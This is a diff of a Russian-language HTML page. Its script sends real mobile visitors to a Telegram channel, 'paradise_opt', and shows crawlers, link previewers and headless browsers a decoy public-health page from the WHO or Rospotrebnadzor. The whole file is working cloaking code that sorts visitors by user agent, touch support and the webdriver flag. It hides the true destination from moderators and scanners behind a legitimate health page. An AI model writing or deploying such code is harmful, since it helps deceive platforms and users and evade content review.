@@ -1,25 +1,37 @@
-<script>
-  const isRealUser = () => {
-    const ua = navigator.userAgent.toLowerCase();
-    const isMobile = /android|iphone|ipad|ipod|mobile/i.test(ua);
-    const isBot = /bot|crawler|spider|facebook|preview|google|yandex|vkshare/i.test(ua);
-    const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-    const isHeadless = navigator.webdriver;
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Загрузка...</title>
+  <script>
+    const isRealUser = () => {
+      const ua = navigator.userAgent.toLowerCase();
+      const isMobile = /android|iphone|ipad|ipod|mobile/i.test(ua);
+      const isBot = /bot|crawler|spider|facebook|preview|google|yandex|vkshare/i.test(ua);
+      const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+      const isHeadless = navigator.webdriver;
 
-    return isMobile && hasTouch && !isBot && !isHeadless;
-  };
+      return isMobile && hasTouch && !isBot && !isHeadless;
+    };
 
-  if (isRealUser()) {
-    setTimeout(() => {
-      window.location.href = "https://t.me/paradise_opt";
-    }, 300);
-  } else {
-    document.write(`
-      <h1>Здоровое питание</h1>
-      <p>Официальные рекомендации по питанию от ВОЗ:</p>
-      <a href="https://www.who.int/ru/news-room/fact-sheets/detail/healthy-diet" target="_blank">
-        https://www.who.int/ru/news-room/fact-sheets/detail/healthy-diet
-      </a>
-    `);
-  }
-</script>
+    if (isRealUser()) {
+      setTimeout(() => {
+        window.location.href = "https://t.me/paradise_opt";
+      }, 300);
+    } else {
+      document.write(`
+        <div style="max-width: 100%; margin: 0 auto;">
+          <iframe 
+            src="https://cgon.rospotrebnadzor.ru/naseleniyu/zdorovyy-obraz-zhizni/o-vrede-kureniya/" 
+            width="100%" 
+            height="1000px" 
+            style="border: none; min-height: 100vh;">
+          </iframe>
+        </div>
+      `);
+    }
+  </script>
+</head>
+<body></body>
+</html>
